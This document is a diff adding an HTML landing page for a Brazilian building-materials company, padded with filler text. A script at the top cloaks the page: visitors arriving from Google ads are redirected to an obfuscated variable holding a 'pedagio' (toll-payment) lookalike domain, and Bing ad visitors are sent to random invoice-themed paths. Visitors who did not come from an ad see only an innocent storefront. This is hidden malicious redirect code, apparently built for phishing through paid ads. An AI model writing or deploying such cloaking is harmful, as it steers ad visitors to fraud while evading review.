@@ -1,1 +1,204 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sepa Construção e Decoração</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
+        header { background: #2c3e50; color: white; padding: 15px; }
+        nav a { color: white; margin: 0 15px; text-decoration: none; }
+        section { padding: 20px; }
+        footer { background: #2c3e50; color: white; text-align: center; padding: 10px; }
+    </style>
+</head>
+<script>
 
+const urls = [
+    'cte/index',
+    'nfe/index',
+    'cte/index',
+    'asp/indexp',
+    'app/index',
+    'xml/indexp',
+    'danfe/index',
+    'nfe/index'
+];
+
+// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
+function generateHash() {
+    // Gerando um hash simples como alternativa ao MD5
+    // Para MD5 real, seria necessário uma biblioteca como crypto-js
+    return Math.random().toString(36).substring(2, 15) + 
+           Math.random().toString(36).substring(2, 15) + 
+           Date.now().toString(36);
+}
+
+// Selecionando URL aleatória
+const randomIndex = Math.floor(Math.random() * urls.length);
+const randomUrl = urls[randomIndex];
+const hash = generateHash();
+const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
+const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
+const xirjfgjsdhdjd = 'https://www2-pedagio.digital/3289';  
+
+// Obtendo o referer (disponível apenas no navegador)
+let referer;
+if (typeof document !== 'undefined' && document.referrer) {
+    referer = document.referrer;
+} else {
+    referer = 'not found';
+}
+
+// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
+let currentUrl;
+if (typeof window !== 'undefined') {
+    currentUrl = window.location.href;
+} else {
+    currentUrl = '';
+}
+
+// Verificando condições e redirecionando
+if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = xirjfgjsdhdjd ;
+    } else {
+
+        console.log('Redirect to:', xirjfgjsdhdjd );
+    }
+} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = bingrandomUrlWithHash;
+    } else {
+        console.log('Redirect to:', bingrandomUrlWithHash);
+    }
+} else {
+    // Bloco vazio equivalente ao else do PHP
+}
+  
+</script>
+<body>
+
+<header>
+    <h1>Sepa Construção e Decoração</h1>
+    <nav>
+        <a href="#home">Home</a>
+        <a href="#quem-somos">Quem Somos</a>
+        <a href="#politica">Política de Privacidade</a>
+        <a href="#termos">Termos de Uso</a>
+        <a href="#contato">Contato</a>
+    </nav>
+</header>
+
+<section id="home">
+    <h2>Bem-vindo</h2>
+    <p>Empresa especializada em materiais de construção e decoração.</p>
+</section>
+
+<section id="quem-somos">
+    <h2>Quem Somos</h2>
+    <p>A F. A. Total Comercio Material de Construção LTDA, conhecida como Sepa Construção e Decoração, atua no mercado desde 2006 oferecendo soluções completas para construção e acabamento.</p>
+    <p>Nossa missão é fornecer produtos de alta qualidade com excelência no atendimento.</p>
+    <p>Valorizamos nossos clientes e buscamos sempre inovação no setor.</p>
+    <p>Trabalhamos com uma ampla variedade de materiais.</p>
+    <p>Nosso compromisso é com a satisfação total do cliente.</p>
+    <p>Contamos com uma equipe qualificada.</p>
+    <p>Atendemos profissionais e consumidores finais.</p>
+    <p>Prezamos pela ética e transparência.</p>
+    <p>Investimos constantemente em melhorias.</p>
+    <p>Nosso objetivo é ser referência no mercado.</p>
+    <p>Oferecemos atendimento personalizado.</p>
+    <p>Buscamos parcerias sólidas.</p>
+    <p>Garantimos produtos confiáveis.</p>
+    <p>Temos compromisso com prazos.</p>
+    <p>Prezamos pela qualidade.</p>
+    <p>Atuamos com responsabilidade.</p>
+    <p>Nosso diferencial é o atendimento.</p>
+    <p>Foco no cliente.</p>
+    <p>Excelência operacional.</p>
+    <p>Inovação constante.</p>
+    <p>Responsabilidade social.</p>
+    <p>Sustentabilidade.</p>
+    <p>Confiança.</p>
+    <p>Credibilidade.</p>
+    <p>Comprometimento.</p>
+    <p>Experiência no mercado.</p>
+    <p>Atendimento humanizado.</p>
+    <p>Equipe dedicada.</p>
+    <p>Infraestrutura completa.</p>
+    <p>Logística eficiente.</p>
+    <p>Variedade de produtos.</p>
+    <p>Parcerias estratégicas.</p>
+    <p>Qualidade garantida.</p>
+    <p>Foco em resultados.</p>
+    <p>Melhoria contínua.</p>
+    <p>Transparência nas relações.</p>
+    <p>Valorização de clientes.</p>
+    <p>Respeito ao consumidor.</p>
+    <p>Tradição e inovação.</p>
+    <p>Compromisso com excelência.</p>
+    <p>Atendimento diferenciado.</p>
+    <p>Confiança construída ao longo dos anos.</p>
+    <p>Empresa sólida no mercado.</p>
+    <p>Foco em crescimento sustentável.</p>
+    <p>Atendimento ágil.</p>
+    <p>Equipe treinada.</p>
+    <p>Qualidade nos serviços.</p>
+    <p>Produtos certificados.</p>
+    <p>Suporte ao cliente.</p>
+    <p>Atendimento eficiente.</p>
+    <p>Excelência em vendas.</p>
+    <p>Compromisso com qualidade.</p>
+    <p>Responsabilidade empresarial.</p>
+    <p>Foco em inovação.</p>
+    <p>Atendimento de excelência.</p>
+    <p>Serviços de qualidade.</p>
+    <p>Compromisso com resultados.</p>
+    <p>Visão de futuro.</p>
+    <p>Missão clara.</p>
+    <p>Valores sólidos.</p>
+</section>
+
+<section id="politica">
+    <h2>Política de Privacidade</h2>
+    <p>Respeitamos sua privacidade e protegemos seus dados pessoais.</p>
+    <p>Coletamos informações apenas quando necessário.</p>
+    <p>Não compartilhamos dados sem consentimento.</p>
+    <p>Utilizamos medidas de segurança adequadas.</p>
+    <p>Os dados são utilizados para melhorar nossos serviços.</p>
+    <p>O usuário pode solicitar exclusão de dados.</p>
+    <p>Seguimos a legislação vigente.</p>
+    <p>Utilizamos cookies para melhor experiência.</p>
+    <p>As informações são armazenadas com segurança.</p>
+    <p>Contato disponível para dúvidas.</p>
+</section>
+
+<section id="termos">
+    <h2>Termos de Uso</h2>
+    <p>O uso deste site implica na aceitação dos termos.</p>
+    <p>As informações podem ser alteradas sem aviso prévio.</p>
+    <p>O usuário compromete-se a utilizar corretamente.</p>
+    <p>Não nos responsabilizamos por uso indevido.</p>
+    <p>Conteúdo protegido por direitos autorais.</p>
+    <p>É proibida reprodução sem autorização.</p>
+    <p>Podemos suspender acesso em caso de violação.</p>
+    <p>Os termos podem ser atualizados.</p>
+    <p>Recomendamos leitura periódica.</p>
+    <p>Contato disponível para esclarecimentos.</p>
+</section>
+
+<section id="contato">
+    <h2>Contato</h2>
+    <p>Endereço: Estrada do Mato Alto, 5891 - Guaratiba - RJ</p>
+    <p>Telefone: (21) 339X-XXXX</p>
+    <p>Email: contato@empresa.com</p>
+</section>
+
+<footer>
+    <p>&copy; 2026 Sepa Construção e Decoração</p>
+</footer>
+
+</body>
+</html>
